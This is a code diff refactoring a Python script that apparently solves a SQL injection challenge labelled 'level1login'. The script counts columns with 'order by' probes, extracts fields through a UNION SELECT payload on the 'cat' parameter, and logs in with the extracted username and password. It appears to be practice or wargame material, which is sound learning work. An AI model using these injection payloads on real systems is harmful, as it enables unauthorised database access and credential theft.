@@ -19,24 +19,14 @@ def main():
     level = 'level1login'
 
     # Counting the number of columns
-    columns = tg.count_columns(url, '1 order by %s', 'cat')
+    data = dict(cat='1 order by %s')
+    if not (columns := tg.count_columns(url, data)):
+        return False
 
-    list_of_columns = [str(c + 1) * 3 for c in range(columns)]
-    print('list of columns: ', list_of_columns)
-
-    # Search for visible columns
-    payload = dict(
-        cat=f"-1 union select {','.join(list_of_columns)} from {table_name}")
-    list_of_visible, html_visible = tg.find_visible_columns(
-        url, list_of_columns, payload)
-
-    # Search for the desired data
-    keys = []
-    for field in finds:
-        list_of_columns[int(list_of_visible[0][0]) - 1] = field
-        payload = dict(
-            cat=f"-1 union select {','.join(list_of_columns)} from {table_name}")
-        keys.append(tg.find_param(url, html_visible, payload))
+    # Search for visible columns and desired data
+    payload = f"-1 union select %s from {table_name}"
+    if not (keys := tg.find_visible_columns(url, columns, payload, 'cat', finds)):
+        return False
 
     # Authorization
     data = dict(user=keys[0], password=keys[1], login='Login')
